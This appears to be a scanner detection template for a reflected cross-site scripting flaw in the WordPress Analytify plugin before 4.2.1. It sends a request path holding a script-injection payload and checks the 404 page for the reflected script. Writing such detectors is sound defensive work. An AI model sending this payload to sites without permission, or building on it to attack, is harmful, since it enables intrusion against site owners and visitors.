id: "analytify-plugin-xss"
name: "Analytify <4.2.1 - Cross-Site Scripting"
severity: "medium"
description: "WordPress Analytify 4.2.1 does not escape the current URL before outputting it back in a 404 page when the 404 tracking feature is enabled, leading to reflected cross-site scripting."
tech:
  - "wordpress"
tags:
  - "wp"
  - "wordpress"
  - "analytify"
  - "wpscan"
  - "wp-plugin"
  - "xss"
  - "vuln"
cwe: "CWE-80"
reference: "https://wpscan.com/vulnerability/b8415ed5-6fd0-42fe-9201-73686c1871c5"
spaExclusion: true
request:
  method: "GET"
  path: "/aa404bb?a</script><script>alert(/XSS/)</script>"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "text/javascript\">alert(/XSS/)</script>"
      - "wp-analytify"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 404
